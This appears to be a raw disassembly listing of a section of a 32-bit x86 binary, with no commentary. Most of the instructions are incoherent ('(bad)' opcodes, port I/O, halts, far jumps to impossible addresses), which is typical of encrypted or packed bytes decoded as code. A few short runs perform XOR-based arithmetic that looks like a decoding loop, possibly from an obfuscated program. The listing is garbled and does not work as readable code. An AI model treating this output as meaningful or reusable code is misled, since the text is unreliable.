  40c804:	or     ecx,DWORD PTR [edx+0x627ea0bc]
  40c80a:	cld    
  40c80b:	ins    BYTE PTR es:[edi],dx
  40c80c:	and    esi,DWORD PTR [ebx]
  40c80e:	pop    ebp
  40c80f:	shr    BYTE PTR [edx],1
  40c811:	int3   
  40c812:	push   ebp
  40c813:	aad    0xeb
  40c815:	and    eax,0x423d31bb
  40c81a:	in     al,dx
  40c81b:	sub    dl,BYTE PTR [ecx-0x50c187ab]
  40c821:	ror    DWORD PTR [edi+esi*8],0x28
  40c825:	int3   
  40c826:	add    ebp,edi
  40c828:	imul   ebx,edx,0xccee0ccd
  40c82e:	push   edx
  40c82f:	mov    bl,0xcf
  40c831:	push   ecx
  40c832:	sti    
  40c833:	push   esi
  40c834:	cmp    eax,DWORD PTR [ecx-0x1f]
  40c837:	(bad)  
  40c838:	jg     0x40c828
  40c83a:	pop    ss
  40c83b:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40c83d:	cld    
  40c83e:	add    eax,0x1aecc4e2
  40c843:	fcom   DWORD PTR [ebp+0x1bbf2fda]
  40c849:	sbb    ebx,ebx
  40c84b:	sub    al,0x83
  40c84d:	das    
  40c84e:	or     DWORD PTR [ebp-0x6f531e0b],esi
  40c854:	jmp    0xd66915d3
  40c859:	outs   dx,DWORD PTR ds:[esi]
  40c85a:	mov    edi,0x553cb385
  40c85f:	xor    eax,0xa52a7cc8
  40c864:	cmp    bh,BYTE PTR [eax]
  40c866:	gs out dx,eax
  40c868:	int    0x33
  40c86a:	bound  esp,QWORD PTR [ebp+0x50bd9fa3]
  40c870:	or     esi,DWORD PTR [esi-0x19f02cf5]
  40c876:	and    edx,DWORD PTR [ecx+0x2a]
  40c879:	jg     0x40c8b2
  40c87b:	jge    0x40c84b
  40c87d:	aas    
  40c87e:	or     edx,DWORD PTR [ebx-0x7c78958]
  40c884:	jno    0x40c8c5
  40c886:	aas    
  40c887:	bound  esi,QWORD PTR [ebp-0x39]
  40c88a:	(bad)  
  40c88b:	out    0xbe,al
  40c88d:	dec    ebx
  40c88e:	sti    
  40c88f:	sti    
  40c890:	adc    al,0xb1
  40c892:	imul   edi,DWORD PTR [esi],0x90202e3f
  40c898:	js     0x40c8c5
  40c89a:	mov    ecx,0xe3a6f100
  40c89f:	jo     0x40c8a8
  40c8a1:	cmp    al,0x9a
  40c8a3:	test   BYTE PTR [ebx-0x34b315e1],bh
  40c8a9:	adc    al,0xb7
  40c8ab:	bound  edx,QWORD PTR [esi-0xc]
  40c8ae:	dec    ecx
  40c8af:	test   edx,0x8ee05b1c
  40c8b5:	mov    ecx,0x2e6ca36
  40c8ba:	sbb    al,0x13
  40c8bc:	push   0x5f
  40c8be:	aam    0xe5
  40c8c0:	cwde   
  40c8c1:	(bad)  
  40c8c2:	pop    ds
  40c8c3:	fsub   DWORD PTR [ecx-0x34]
  40c8c6:	clc    
  40c8c7:	push   ebx
  40c8c8:	dec    esp
  40c8c9:	xlat   BYTE PTR ds:[ebx]
  40c8ca:	jo     0x40c87f
  40c8cc:	sub    eax,0x29ca8a01
  40c8d1:	jge    0x40c87d
  40c8d3:	xor    DWORD PTR [ebx-0x47],ecx
  40c8d6:	mov    ecx,0xdc1adaf7
  40c8db:	repnz adc DWORD PTR [edi-0x3f],0xffffffe6
  40c8e0:	in     eax,0x83
  40c8e2:	loop   0x40c8b2
  40c8e4:	push   ebx
  40c8e5:	aad    0x53
  40c8e7:	and    esi,DWORD PTR [edi-0x4c1312ca]
  40c8ed:	mov    edi,DWORD PTR [ebp-0x18]
  40c8f0:	xor    edi,eax
  40c8f2:	add    edi,DWORD PTR [ebp-0x14]
  40c8f5:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8f8:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c8ff:	mov    edx,DWORD PTR [ebp-0x44]
  40c902:	mov    edi,DWORD PTR [ebp-0xc]
  40c905:	xor    edx,eax
  40c907:	jmp    0x40ccc5
  40c90c:	sbb    al,0xba
  40c90e:	pop    edx
  40c90f:	pop    edx
  40c910:	pop    edx
  40c911:	pop    edx
  40c912:	sbb    al,0xba
  40c914:	adc    edi,DWORD PTR [edi+edi*1-0x3]
  40c918:	pushf  
  40c919:	out    dx,al
  40c91a:	or     cl,BYTE PTR [ecx+0x707094ec]
  40c920:	lahf   
  40c921:	jge    0x40c993
  40c923:	jo     0x40c948
  40c925:	cli    
  40c926:	mov    WORD PTR [ebx+0x2ab19bfd],ds
  40c92c:	push   0xa842a7fa
  40c931:	mov    es,WORD PTR [eax+eax*4-0x6f]
  40c935:	push   ds
  40c936:	int3   
  40c937:	mov    bl,0x4
  40c939:	into   
  40c93a:	mov    edi,0xfc35af77
  40c93f:	mov    ch,0x72
  40c941:	xchg   edi,eax
  40c942:	mov    ebx,0xf35226a1
  40c947:	fimul  DWORD PTR [esi-0x1da96215]
  40c94d:	add    DWORD PTR [ecx+0x3cf92e89],esi
  40c953:	in     al,dx
  40c954:	leave  
  40c955:	dec    ebx
  40c956:	ja     0x40c91e
  40c958:	push   es
  40c959:	sbb    DWORD PTR [esi-0x69825564],ebx
  40c95f:	into   
  40c960:	xlat   BYTE PTR ds:[ebx]
  40c961:	mov    ds:0x35b6e97e,al
  40c966:	mov    ds:0xc1c98eb2,eax
  40c96b:	lea    edx,[edi]
  40c96d:	test   al,0x83
  40c96f:	adc    bh,BYTE PTR [edx+0x3a]
  40c972:	lds    esi,FWORD PTR [eax-0xf]
  40c975:	stos   DWORD PTR es:[edi],eax
  40c976:	mov    dl,0xa9
  40c978:	inc    esi
  40c979:	fidivr WORD PTR [eax]
  40c97b:	cmp    DWORD PTR [ebx+0x64caa5c7],eax
  40c981:	sbb    al,bh
  40c983:	stos   BYTE PTR es:[edi],al
  40c984:	sahf   
  40c985:	push   0xffffffab
  40c987:	bound  eax,QWORD PTR [ebx-0x15]
  40c98a:	xchg   edx,eax
  40c98b:	adc    ebx,DWORD PTR [ecx+0x488cc8e5]
  40c991:	inc    ecx
  40c992:	push   esi
  40c993:	fs pop eax
  40c995:	fisttp QWORD PTR [edx]
  40c997:	push   es
  40c998:	xchg   BYTE PTR [esi],al
  40c99a:	mov    al,ds:0xd81440bf
  40c99f:	jge    0x40c999
  40c9a1:	add    eax,DWORD PTR [esi+0x39]
  40c9a4:	sbb    bh,BYTE PTR [edx-0x3c]
  40c9a7:	dec    edx
  40c9a8:	mov    dh,0xf6
  40c9aa:	je     0x40ca0e
  40c9ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9ad:	xor    DWORD PTR [ebx+0x5e],esp
  40c9b0:	pop    edi
  40c9b1:	push   ss
  40c9b2:	(bad)  
  40c9b3:	cld    
  40c9b4:	pop    ebx
  40c9b5:	imul   esp,edx,0xa8b0767c
  40c9bb:	call   0x5294:0x2cd67aae
  40c9c2:	jnp    0x40c94a
  40c9c4:	and    al,ah
  40c9c6:	stos   DWORD PTR es:[edi],eax
  40c9c7:	mov    ds:0x4c80c078,al
  40c9cc:	les    edi,FWORD PTR [esi+edx*8-0x1a]
  40c9d0:	sbb    BYTE PTR [edx-0x3e],al
  40c9d3:	out    0xeb,al
  40c9d5:	fcomp  QWORD PTR ds:0xfd757b8f
  40c9db:	rcr    BYTE PTR ds:0x78fa01eb,0x39
  40c9e2:	dec    ecx
  40c9e3:	outs   dx,BYTE PTR ds:[esi]
  40c9e4:	sub    BYTE PTR [ebp-0x59ed4e5],bl
  40c9ea:	sbb    eax,0xfba3a4f4
  40c9ef:	sub    BYTE PTR [ecx-0x79],cl
  40c9f2:	mov    esi,0x27758c53
  40c9f7:	add    DWORD PTR [ecx+0x4dde3d98],0x29312259
  40ca01:	or     BYTE PTR cs:[ecx-0x6d1ce744],dl
  40ca08:	inc    ebx
  40ca09:	into   
  40ca0a:	(bad)  
  40ca0b:	out    0xbe,al
  40ca0d:	sar    DWORD PTR [eax+0x7deee152],1
  40ca13:	sti    
  40ca14:	in     al,0x67
  40ca16:	cli    
  40ca17:	push   edi
  40ca18:	jne    0x40ca09
  40ca1a:	(bad)  
  40ca1b:	fcmovnu st,st(4)
  40ca1d:	add    dl,BYTE PTR [ebp+0x1b]
  40ca20:	and    edi,DWORD PTR [edx-0x58]
  40ca23:	push   0x4a
  40ca25:	jecxz  0x40ca59
  40ca27:	sar    DWORD PTR [eax+0x22efe02b],cl
  40ca2d:	hlt    
  40ca2e:	sbb    DWORD PTR [eax+0x23],0x408c8f90
  40ca35:	lock cmp al,0x18
  40ca38:	adc    BYTE PTR [ebp-0x69],cl
  40ca3b:	aad    0x35
  40ca3d:	jle    0x40c9f4
  40ca3f:	and    al,0xd
  40ca41:	xchg   ebp,eax
  40ca42:	ret    
  40ca43:	lds    ebp,FWORD PTR [ebp+esi*2+0x5c]
  40ca47:	dec    edx
  40ca48:	sar    BYTE PTR ds:0xc854b872,1
  40ca4e:	jmp    0x40ca0c
  40ca50:	(bad)  
  40ca51:	cmc    
  40ca52:	and    DWORD PTR ds:0x9697c194,0xbfc03a3d
  40ca5c:	pop    ecx
  40ca5d:	out    0xc0,al
  40ca5f:	dec    esi
  40ca60:	stos   BYTE PTR es:[edi],al
  40ca61:	mov    ch,0xf9
  40ca63:	mov    eax,ds:0xb252f345
  40ca68:	(bad)
  40ca6c:	cld    
  40ca6d:	sar    DWORD PTR [edx+ebx*1],cl
  40ca70:	jns    0x40ca97
  40ca72:	bnd ret 0xf210
  40ca76:	outs   dx,BYTE PTR ds:[esi]
  40ca77:	rol    DWORD PTR [edi],0x90
  40ca7a:	push   ss
  40ca7b:	push   ss
  40ca7c:	std    
  40ca7d:	loopne 0x40caf5
  40ca7f:	in     eax,dx
  40ca80:	xor    al,0x7d
  40ca82:	lahf   
  40ca83:	std    
  40ca84:	pusha  
  40ca85:	mov    ebx,0xf6c0e48e
  40ca8a:	push   es
  40ca8b:	push   edx
  40ca8c:	aaa    
  40ca8d:	mov    cl,0x4e
  40ca8f:	mov    cx,0x9438
  40ca93:	fidivr WORD PTR [edi-0x53461381]
  40ca99:	push   ebx
  40ca9a:	dec    esp
  40ca9b:	test   BYTE PTR [ecx-0x3f],cl
  40ca9e:	les    ebx,FWORD PTR [edi+0x29]
  40caa1:	adc    al,0x30
  40caa3:	inc    esi
  40caa4:	sbb    eax,0x230a7f8b
  40caa9:	fidivr WORD PTR [ecx-0x4a]
  40caac:	inc    esp
  40caad:	dec    ebx
  40caae:	int    0x6c
  40cab0:	out    dx,eax
  40cab1:	jp     0x40cab7
  40cab3:	(bad)  
  40cab4:	sbb    esp,DWORD PTR [esi]
  40cab6:	and    edi,eax
  40cab8:	mov    ebp,0x9c183334
  40cabd:	cmp    BYTE PTR [edx],bl
  40cabf:	div    BYTE PTR [esi+esi*1]
  40cac2:	xor    BYTE PTR [esp+edx*8+0x67224712],al
  40cac9:	clc    
  40caca:	pop    ecx
  40cacb:	lds    esp,FWORD PTR [edi+0x648ce72b]
  40cad1:	arpl   WORD PTR [edi-0xc2e7498],ax
  40cad7:	fnstenv ds:0x566796b9
  40cadd:	aaa    
  40cade:	adc    dh,BYTE PTR [esi-0x33]
  40cae1:	fidivr WORD PTR [ecx+0x4608281c]
  40cae7:	mov    BYTE PTR [esi+0x29],bl
  40caea:	stos   BYTE PTR es:[edi],al
  40caeb:	sub    BYTE PTR [eax-0x7e],cl
  40caee:	pop    edi
  40caef:	inc    ecx
  40caf0:	ffreep st(5)
  40caf2:	popf   
  40caf3:	mov    dl,0xbc
  40caf5:	ss call 0x6fe0:0x26703a15
  40cafd:	cmp    BYTE PTR fs:[ebx+0x5796cc7c],ch
  40cb04:	adc    eax,0xe72ab2d4
  40cb09:	mov    ebp,0xdc5f2d41
  40cb0e:	pop    edx
  40cb0f:	xchg   ebx,eax
  40cb10:	xchg   esp,eax
  40cb11:	out    dx,eax
  40cb12:	js     0x40cb57
  40cb14:	hlt    
  40cb15:	cdq    
  40cb16:	in     al,0x33
  40cb18:	xchg   esi,eax
  40cb19:	sahf   
  40cb1a:	arpl   WORD PTR ds:0x865468b6,ax
  40cb20:	(bad)  
  40cb21:	and    al,0x91
  40cb23:	lock popa 
  40cb25:	dec    ecx
  40cb26:	lidtd  [ecx]
  40cb29:	in     eax,0xd8
  40cb2b:	pop    ss
  40cb2c:	mov    ds:0xd38a411c,eax
  40cb31:	sbb    esi,DWORD PTR [ebx+0x5b259960]
  40cb37:	rcr    DWORD PTR [edi],0x40
  40cb3a:	jo     0x40caeb
  40cb3c:	inc    esi
  40cb3d:	jb     0x40cac8
  40cb3f:	iret   
  40cb40:	(bad)  
  40cb42:	cwde   
  40cb43:	mov    al,0xb9
  40cb45:	loopne 0x40caca
  40cb47:	fucomi st,st(7)
  40cb49:	out    dx,eax
  40cb4a:	xor    DWORD PTR [edx],edx
  40cb4c:	mov    ah,0x90
  40cb4e:	pop    esi
  40cb4f:	add    al,BYTE PTR gs:[eax-0x65]
  40cb53:	sbb    al,0x37
  40cb55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb56:	inc    eax
  40cb57:	jmp    0x40cb67
  40cb59:	test   eax,0xfd05fae9
  40cb5e:	lock fsubr DWORD PTR [edi-0x1f9c3f40]
  40cb65:	jmp    0x40cb2a
  40cb67:	mov    esp,0x2f8c575f
  40cb6c:	inc    esi
  40cb6d:	push   esi
  40cb6e:	loopne 0x40cb34
  40cb70:	retf   
  40cb71:	test   DWORD PTR [ecx-0x4db37bd7],eax
  40cb77:	push   esi
  40cb78:	stos   BYTE PTR es:[edi],al
  40cb79:	imul   esp,DWORD PTR [edx+edx*8+0x33],0x82d86b86
  40cb81:	fiadd  DWORD PTR [esi-0x391b18c6]
  40cb87:	dec    edi
  40cb88:	jo     0x40cb28
  40cb8a:	sub    al,0x96
  40cb8c:	repnz popa 
  40cb8e:	cmp    al,0xa2
  40cb90:	xor    DWORD PTR [esi-0xe],eax
  40cb93:	sbb    dh,bh
  40cb95:	ins    DWORD PTR es:[edi],dx
  40cb96:	outs   dx,BYTE PTR ds:[esi]
  40cb97:	sub    ebp,DWORD PTR [edx+0x53]
  40cb9a:	xlat   BYTE PTR ds:[ebx]
  40cb9b:	frstor [esi-0x79]
  40cb9e:	mov    DWORD PTR [edi+0x2d27c8c],edi
  40cba4:	sbb    DWORD PTR [ebp-0x2c],esp
  40cba7:	cs daa 
  40cba9:	cmp    ch,0x2d
  40cbac:	ins    DWORD PTR es:[edi],dx
  40cbad:	fidiv  WORD PTR [ebp+eax*2-0x68]
  40cbb1:	mov    al,ds:0x2a3b681a
  40cbb6:	and    BYTE PTR [ebx],0x29
  40cbb9:	mov    cl,0x86
  40cbbb:	lea    ecx,[esi+0x47668b0f]
  40cbc1:	pop    ebp
  40cbc2:	and    bl,dh
  40cbc4:	ja     0x40cbd3
  40cbc6:	sbb    ah,al
  40cbc8:	push   cs
  40cbc9:	int3   
  40cbca:	mov    ecx,fs
  40cbcc:	nop    DWORD PTR [edx+edi*1-0x65]
  40cbd1:	loope  0x40cbb7
  40cbd3:	lahf   
  40cbd4:	shl    BYTE PTR [ecx+0x7d],1
  40cbd7:	jmp    0x98421567
  40cbdc:	pop    eax
  40cbdd:	inc    ebx
  40cbde:	inc    ecx
  40cbdf:	ins    BYTE PTR es:[edi],dx
  40cbe0:	xor    edx,DWORD PTR [edx+0x1e]
  40cbe3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbe4:	in     eax,dx
  40cbe5:	out    dx,al
  40cbe6:	cmp    BYTE PTR [eiz*4+0x4390ea90],dl
  40cbed:	cmp    al,BYTE PTR [edi-0x2a]
  40cbf0:	jnp    0x40cc4d
  40cbf2:	jae    0x40cbb9
  40cbf4:	mov    ch,0x2a
  40cbf6:	dec    edx
  40cbf7:	int    0x1f
  40cbf9:	mov    ds,edi
  40cbfb:	fisub  WORD PTR fs:[ebp+eax*4-0x65b46630]
  40cc03:	hlt    
  40cc04:	mov    eax,0x911d3f43
  40cc09:	jo     0x40cbd2
  40cc0b:	mov    ah,0xcb
  40cc0d:	adc    esi,ebp
  40cc0f:	inc    ebp
  40cc10:	ret    0x5f18
  40cc13:	sbb    eax,0x84e1613c
  40cc18:	lock adc esp,eax
  40cc1b:	div    DWORD PTR [ebx+0x459c6960]
  40cc21:	pop    ebp
  40cc22:	(bad)  
  40cc23:	sar    BYTE PTR [eax-0x5e],cl
  40cc26:	(bad)  
  40cc27:	dec    ebp
  40cc28:	pop    ebp
  40cc29:	js     0x40cc20
  40cc2b:	sub    eax,0xd2afe15e
  40cc30:	imul   esi,DWORD PTR [eax-0x210176b3],0x65a528a8
  40cc3a:	mov    al,ds:0x7fc241ba
  40cc3f:	push   edx
  40cc40:	cmp    DWORD PTR [ecx-0x694ad758],ebx
  40cc46:	jns    0x40cbe1
  40cc48:	jo     0x40cc2d
  40cc4a:	inc    eax
  40cc4b:	adc    edi,eax
  40cc4d:	pop    edx
  40cc4e:	pusha  
  40cc4f:	mov    ds:0xffd58dbf,al
  40cc54:	jmp    0x40cc13
  40cc56:	sar    dh,cl
  40cc58:	test   BYTE PTR [esi-0x32],dh
  40cc5b:	xchg   ecx,eax
  40cc5c:	ficomp WORD PTR [ecx+esi*4+0x7b]
  40cc60:	sbb    bh,al
  40cc62:	repnz popf 
  40cc64:	and    cx,WORD PTR [esp+esi*2+0x3ccd0e63]
  40cc6c:	adc    DWORD PTR ds:0x32723939,0x964942f0
  40cc76:	iret   
  40cc77:	sar    BYTE PTR [edi-0x5d],1
  40cc7a:	push   ebx
  40cc7b:	dec    eax
  40cc7c:	fist   WORD PTR [ebp+0x270d1e6f]
  40cc82:	mov    ds:0x3d015eb1,eax
  40cc87:	push   edx
  40cc88:	int3   
  40cc89:	and    DWORD PTR [edi+0x7d],ebp
  40cc8c:	pop    es
  40cc8d:	pop    ebx
  40cc8e:	xchg   edx,eax
  40cc8f:	cs (bad) 
  40cc91:	call   0x383d270e
  40cc96:	or     BYTE PTR [edi],ah
  40cc98:	test   eax,0x1835da2e
  40cc9d:	popa   
  40cc9e:	sbb    cl,BYTE PTR [eax+eax*8]
  40cca1:	shr    BYTE PTR ss:[eax+0x3],0xb9
  40cca6:	push   ecx
  40cca7:	jle    0x40cc29
  40cca9:	fcom   DWORD PTR [eax-0x4]
  40ccac:	cs in  al,0xa1
  40ccaf:	sbb    eax,0x72406f87
  40ccb4:	sbb    al,0x27
  40ccb6:	lock shl ch,cl
  40ccb9:	mov    ebx,0xc7db1a0b
  40ccbe:	imul   edx,DWORD PTR [eax-0x14],0xffffffe7
  40ccc2:	fbld   TBYTE PTR [ecx+0x3f833f0]
  40ccc8:	rol    DWORD PTR [ebx],1
  40ccca:	stc    
  40cccb:	imul   edx,edi
  40ccce:	add    edx,DWORD PTR [ebp-0x14]
  40ccd1:	mov    DWORD PTR [ebp-0x14],edx
  40ccd4:	mov    edx,DWORD PTR [ebp-0xc]
  40ccd7:	mov    edi,DWORD PTR [ebp-0x24]
  40ccda:	xor    edx,eax
  40ccdc:	add    edx,ecx
  40ccde:	imul   edx,edi
  40cce1:	mov    edi,DWORD PTR [ebp-0xc]
  40cce4:	xor    edi,eax
  40cce6:	sub    edx,edi
  40cce8:	mov    edi,DWORD PTR [ebp-0xc]
  40cceb:	mov    ebx,DWORD PTR [ebp-0x14]
  40ccee:	xor    edi,eax
  40ccf0:	add    edi,ecx
  40ccf2:	imul   edi,ebx
  40ccf5:	mov    ebx,DWORD PTR [ebp-0x18]
  40ccf8:	xor    ebx,eax
  40ccfa:	sub    edx,ecx
  40ccfc:	lea    edi,[edi+ebx*1+0x32729c]
  40cd03:	cmp    edi,edx
  40cd05:	jmp    0x40d0c3
  40cd0a:	mov    eax,0xf165d76a
  40cd0f:	popa   
  40cd10:	jbe    0x40cd7b
  40cd12:	(bad)  
  40cd14:	xchg   ebx,eax
  40cd15:	xor    DWORD PTR [ecx+edx*2],0xffffffd3
  40cd19:	adc    BYTE PTR [ebx],cl
  40cd1b:	nop
  40cd1c:	jo     0x40cd8e
  40cd1e:	lahf   
  40cd1f:	jge    0x40cd91
  40cd21:	jo     0x40cd38
  40cd23:	fs sahf 
  40cd25:	mov    BYTE PTR [ebx+eiz*4-0x63],dl
  40cd29:	nop
  40cd2a:	iret   
  40cd2b:	popa   
  40cd2c:	popf   
  40cd2d:	lahf   
  40cd2e:	sti    
  40cd2f:	inc    eax
  40cd30:	jne    0x40cd18
  40cd32:	les    esi,FWORD PTR [esi-0x431bd8df]
  40cd38:	shr    ebx,1
  40cd3a:	inc    edx
  40cd3b:	sbb    DWORD PTR ds:0xdfdd77d1,eax
  40cd41:	push   0x21a7412
  40cd46:	xchg   BYTE PTR [edx-0x4a5273ab],dl
  40cd4c:	inc    esp
  40cd4d:	mov    ebx,0xf6d47479
  40cd52:	xor    DWORD PTR [eax],edi
  40cd54:	in     al,dx
  40cd55:	mov    al,al
  40cd57:	mov    ebp,0x71631d20
  40cd5c:	add    edi,DWORD PTR [eax+0x7885d704]
  40cd62:	shl    DWORD PTR [edx+ebp*8-0x53],cl
  40cd66:	xor    bl,BYTE PTR [edx-0x63]
  40cd69:	out    dx,eax
  40cd6a:	mov    edx,0x9f589036
  40cd6f:	fidivr WORD PTR [edx-0x43bf036d]
  40cd75:	scas   eax,DWORD PTR es:[edi]
  40cd76:	mov    esi,0x34c766ee
  40cd7b:	mov    ecx,0x134c2ac1
  40cd80:	push   ebp
  40cd81:	inc    ebp
  40cd82:	aaa    
  40cd83:	dec    ebp
  40cd84:	jg     0x40cd68
  40cd86:	add    ebx,DWORD PTR [edx+0x160cab02]
  40cd8c:	call   0x57bb:0x44c52702
  40cd93:	mov    WORD PTR [esi],fs
  40cd95:	scas   al,BYTE PTR es:[edi]
  40cd96:	pop    edi
  40cd97:	sbb    cl,0xa
  40cd9a:	cli    
  40cd9b:	fstp   st(2)
  40cd9d:	mov    es,WORD PTR [edx+edx*2]
  40cda0:	cmp    eax,0x172b2706
  40cda5:	add    edx,ebp
  40cda7:	push   ss
  40cda8:	xor    ch,BYTE PTR [edx]
  40cdaa:	cli    
  40cdab:	add    eax,DWORD PTR [edx+0x1e]
  40cdae:	dec    ebx
  40cdaf:	ret    0x1836
  40cdb2:	adc    ah,BYTE PTR [ebx+ebx*1-0x1eb7c28]
  40cdb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdba:	cmp    ch,dl
  40cdbc:	mov    eax,ds:0x79448cee
  40cdc1:	into   
  40cdc2:	mov    ebx,0x8f8be49f
  40cdc7:	ret    0xd2b6
  40cdca:	mov    ah,0x6c
  40cdcc:	fdiv   QWORD PTR [edx]
  40cdce:	div    esi
  40cdd0:	mov    ecx,0x22e78b6
  40cdd5:	pop    esp
  40cdd6:	in     eax,dx
  40cdd7:	aad    0x44
  40cdd9:	mov    ecx,0xb0a40e57
  40cdde:	bound  edi,QWORD PTR [edx+0x430e48ad]
  40cde4:	loop   0x40ce3e
  40cde6:	and    BYTE PTR [ecx-0x31e51985],ch
  40cdec:	shr    esi,cl
  40cdee:	les    ecx,FWORD PTR [esi]
  40cdf0:	pop    ebp
  40cdf1:	mov    dh,0x7
  40cdf3:	out    0x30,eax
  40cdf5:	add    BYTE PTR [edi+edx*4+0x6446ddb6],dh
  40cdfc:	out    0xbf,al
  40cdfe:	(bad)  
  40cdff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce00:	pushf  
  40ce01:	mov    ds:0x8ef828c1,eax
  40ce06:	cmp    DWORD PTR [ebx],eax
  40ce08:	inc    edi
  40ce09:	test   BYTE PTR ds:0x729d4311,ch
  40ce0f:	jmp    0xe543f100
  40ce14:	(bad)  
  40ce15:	dec    edi
  40ce16:	gs push ebx
  40ce18:	call   0xe49e69a
  40ce1d:	(bad)  
  40ce1e:	(bad)  
  40ce1f:	imul   esp,DWORD PTR [edx+ecx*2-0x6217c7cb],0x71
  40ce27:	popf   
  40ce28:	mov    ebx,0x24ce3c63
  40ce2d:	js     0x40ce2a
  40ce2f:	mov    ecx,0x8177381e
  40ce34:	cli    
  40ce35:	inc    esp
  40ce36:	push   ebp
  40ce37:	lds    esp,FWORD PTR [edi]
  40ce39:	in     eax,dx
  40ce3a:	adc    al,0xe2
  40ce3c:	jb     0x40cdf5
  40ce3e:	add    eax,0x4c88839e
  40ce43:	sbb    al,0xcd
  40ce45:	test   al,0xa6
  40ce47:	adc    bh,BYTE PTR [eax-0xd]
  40ce4a:	in     al,dx
  40ce4b:	shl    BYTE PTR [esi+0x16784459],cl
  40ce51:	jle    0x40ce33
  40ce53:	iret   
  40ce54:	mov    ds:0x8a8b54e4,eax
  40ce59:	fcomp  DWORD PTR [edx]
  40ce5b:	push   0xdbee82c9
  40ce60:	xchg   edi,eax
  40ce61:	js     0x40cea6
  40ce63:	ret    0xd830
  40ce66:	mov    dh,0xc0
  40ce68:	xchg   esi,eax
  40ce69:	cdq    
  40ce6a:	cmp    DWORD PTR [ecx],ebx
  40ce6c:	ins    BYTE PTR es:[edi],dx
  40ce6d:	mov    cx,0x8723
  40ce71:	adc    cl,BYTE PTR [edi]
  40ce73:	push   0x35
  40ce75:	sbb    eax,0x2d34f2a2
  40ce7a:	stos   DWORD PTR es:[edi],eax
  40ce7b:	pop    edi
  40ce7c:	sub    eax,0xefa95d20
  40ce81:	add    ecx,DWORD PTR [ebx-0x3a]
  40ce84:	mov    eax,ds:0xe6db8acb
  40ce89:	jne    0x40ce2d
  40ce8b:	xchg   edx,eax
  40ce8c:	jno    0x40ce30
  40ce8e:	addr16 ja 0x40cee6
  40ce91:	(bad)  
  40ce92:	repz mov ds:0xb74f83a2,eax
  40ce98:	xadd   DWORD PTR ds:0xb1e4f2bb,ecx
  40ce9f:	jle    0x40ce4e
  40cea1:	mov    ebp,0x19b0dddf
  40cea6:	dec    esp
  40cea7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cea8:	dec    esi
  40cea9:	out    dx,eax
  40ceaa:	dec    edx
  40ceab:	inc    esi
  40ceac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cead:	jmp    FWORD PTR [ecx+edi*8+0x7b695006]
  40ceb4:	(bad)  
  40ceb5:	in     eax,0xe7
  40ceb7:	in     al,0xcd
  40ceb9:	mov    ch,0x3b
  40cebb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cebc:	cli    
  40cebd:	les    esi,FWORD PTR [ebx-0x40]
  40cec0:	jmp    0x40cf32
  40cec2:	pop    ecx
  40cec3:	pop    ebx
  40cec4:	mov    esi,edi
  40cec6:	shr    BYTE PTR [ebx-0x35961815],0x67
  40cecd:	in     al,dx
  40cece:	mov    ds,WORD PTR [ebx-0x18]
  40ced1:	mov    edi,0x5c0416ab
  40ced6:	mov    dl,0x30
  40ced8:	in     eax,dx
  40ced9:	mov    al,0xc
  40cedb:	stc    
  40cedc:	sbb    BYTE PTR [eax+0x1a8aebd3],al
  40cee2:	and    BYTE PTR [edi-0xe03e5d0],al
  40cee8:	setno  BYTE PTR [ebx+0x107a906e]
  40ceef:	mov    dh,0xfb
  40cef1:	fstp   DWORD PTR [ecx+0x5ce5532f]
  40cef7:	(bad)  
  40cef9:	test   eax,0xe7604b20
  40cefe:	hlt    
  40ceff:	popa   
  40cf00:	arpl   WORD PTR ds:0x7c169832,cx
  40cf06:	push   edx
  40cf07:	xlat   BYTE PTR ds:[ebx]
  40cf08:	mov    si,0x11cf
  40cf0c:	adc    ch,BYTE PTR [ebp+0x11]
  40cf0f:	adc    al,0x8d
  40cf11:	cmp    eax,DWORD PTR [edi+eax*4-0x18]
  40cf15:	ins    DWORD PTR es:[edi],dx
  40cf16:	mov    edx,DWORD PTR [edx-0x8a798a]
  40cf1c:	jae    0x40cebe
  40cf1e:	xchg   esp,eax
  40cf1f:	mov    ch,0x44
  40cf21:	aam    0xf7
  40cf23:	stos   DWORD PTR es:[edi],eax
  40cf24:	jecxz  0x40cf27
  40cf26:	mov    edx,0x180380aa
  40cf2b:	(bad)  
  40cf2c:	das    
  40cf2d:	fisttp WORD PTR [edx+ebx*8+0x769a3290]
  40cf34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf35:	cwde   
  40cf36:	(bad)  
  40cf37:	pop    ebp
  40cf38:	mov    ch,0x6d
  40cf3a:	out    0x0,eax
  40cf3c:	mov    edi,0xd61b5a0a
  40cf41:	mov    al,ds:0x9cdb1d91
  40cf46:	neg    edi
  40cf48:	push   esp
  40cf49:	cld    
  40cf4a:	out    0x63,al
  40cf4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf4d:	add    eax,0xe24cb8ba
  40cf52:	jb     0x40ced4
  40cf54:	idiv   cl
  40cf56:	sub    DWORD PTR [ecx],0x18
  40cf59:	sbb    DWORD PTR [esi+0x51902441],edi
  40cf5f:	gs pusha 
  40cf61:	hlt    
  40cf62:	out    dx,al
  40cf63:	jb     0x40cf3c
  40cf65:	and    ah,BYTE PTR [ebx]
  40cf67:	jge    0x40cf8f
  40cf69:	aaa    
  40cf6a:	pop    eax
  40cf6b:	stc    
  40cf6c:	fdiv   DWORD PTR [edx]
  40cf6e:	pop    eax
  40cf6f:	mov    edi,0xff5eff68
  40cf74:	jmp    0x74f5:0x625b7ce
  40cf7b:	pop    esi
  40cf7c:	xchg   ecx,eax
  40cf7d:	ds (bad) 
  40cf7f:	xor    al,0x99
  40cf81:	push   cs
  40cf82:	stos   DWORD PTR es:[edi],eax
  40cf83:	jmp    0x8eecc0b6
  40cf88:	out    dx,al
  40cf89:	push   es
  40cf8a:	push   0xffffffe5
  40cf8c:	nop
  40cf8d:	rcl    DWORD PTR [ebp-0x559a5a28],1
